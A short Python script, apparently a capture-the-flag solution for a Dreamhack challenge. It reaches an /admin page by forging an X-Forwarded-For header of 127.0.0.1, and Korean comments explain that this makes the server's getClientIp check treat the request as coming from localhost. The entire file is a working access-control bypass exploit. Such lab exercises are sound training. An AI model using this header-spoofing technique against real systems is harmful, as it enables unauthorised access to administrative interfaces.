import requests

url = "http://host3.dreamhack.games:14918/admin"

# 조작된 헤더 만들기
# 서버의 getClientIp 함수가 127.0.0.1로 착각하게 만듦
headers = {
    "X-Forwarded-For": "127.0.0.1",
}

try:
    response = requests.get(url, headers=headers)
    
    print(f"Status Code: {response.status_code}")
    print("--- Response Content ---")
    print(response.text)
except Exception as e:
    print(f"Error: {e}")